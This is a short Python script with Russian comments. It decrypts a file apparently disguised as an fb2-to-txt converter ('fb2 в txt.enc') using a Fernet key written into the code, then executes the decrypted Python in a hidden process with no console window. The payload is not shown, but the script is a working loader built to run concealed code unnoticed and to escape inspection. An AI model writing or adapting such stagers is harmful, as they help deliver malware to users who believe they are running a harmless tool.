import os
import io
import sys
import subprocess
from cryptography.fernet import Fernet

def decrypt_and_execute_file(file_path, key):
    if not os.path.isfile(file_path):
        print('Ошибка: Файл не найден.')
        return

    cipher_suite = Fernet(key)

    with open(file_path, 'rb') as file:
        encrypted_data = file.read()

    try:
        decrypted_data = cipher_suite.decrypt(encrypted_data)
    except:
        print('Ошибка: Неверный ключ шифрования или файл поврежден.')
        return

    temp_file = io.BytesIO(decrypted_data)

    # Определяем команду для запуска скрипта без открытия консоли
    command = [sys.executable, '-c', temp_file.getvalue().decode()] 

    # Запускаем процесс без открытия консоли
    subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW)

if __name__ == '__main__':
    file_path = os.path.join(os.path.dirname(__file__), 'fb2 в txt.enc') # имя файла
    key = b'P6lKSnXZ6dY1CB_LyWy04p1xp7SPKQmumLudDK-XDFM=' # ключ шифрования

    decrypt_and_execute_file(file_path, key)
